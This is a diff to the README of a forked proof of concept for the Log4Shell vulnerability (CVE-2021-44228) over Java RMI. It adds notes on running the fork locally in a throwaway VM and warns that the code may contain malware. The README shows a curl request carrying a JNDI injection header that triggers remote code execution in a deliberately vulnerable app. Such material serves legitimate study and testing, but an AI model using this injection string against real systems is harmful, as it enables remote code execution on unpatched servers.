@@ -1,3 +1,12 @@
+A minor change to the forked original:
+1. Getting it to work
+2. Getting it to work on a Linux VM with JDK 8
+3. Limiting it to open its ports localy only
+
+This code may contain malware and is known to contain vulnerabilities. 
+
+Use at your own risk - if you use it, be advised to do that in a VM  - discard the VM after use.
+
 # log4shell-rmi-poc
 A Proof of Concept of the Log4j vulnerability (CVE-2021-44228) over Java-RMI
 <br/>
@@ -49,9 +58,7 @@ java -jar target/vulnerabel_log4j_app-0.0.1-SNAPSHOT.jar
 curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.0.1:1099/ExecByEL}'
 ```
 
-As you can see the the vulnerable app calls the Calculator app.
-
-![exploit](./exploit.png)
+The file /tmp/JNDIPoc gets updated (touch "/tmp/JNDIPoc" is executed).
 
 ## References 
 https://www.cisecurity.org/log4j-zero-day-vulnerability-response/
